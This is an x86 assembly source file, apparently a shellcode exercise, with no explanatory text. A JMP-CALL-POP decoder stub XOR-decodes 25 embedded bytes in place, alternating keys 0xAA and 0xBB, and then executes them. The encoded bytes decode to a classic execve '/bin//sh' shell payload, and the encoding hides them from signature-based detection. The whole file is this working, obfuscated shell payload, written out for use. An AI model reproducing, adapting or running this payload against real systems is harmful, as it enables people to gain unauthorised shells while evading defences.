global _start			

section .text
_start:
	jmp short call_shellcode

decoder:
	pop esi
	xor ecx, ecx
	mov cl, 25

decode:
	test cl, 1
	jz even   
	jnz odd
even:
	mov bx, [esi]
    xor bx, 0xBB
	mov [esi], bl

    inc esi
    loop decode
	jmp short EncodedShellcode
odd:
	mov bx, [esi]
    xor bx, 0xAA
	mov [esi], bl

    inc esi
    loop decode
	jmp short EncodedShellcode

call_shellcode:

	call decoder
	EncodedShellcode: db 0x9b,0x7b,0xfa,0xd3,0x85,0x94,0xd9,0xd3,0xc2,0x94,0xc8,0xd2,0xc4,0x32,0x49,0xeb,0x23,0x59,0xf9,0x32,0x4b,0x0b,0xa1,0x76,0x2a 
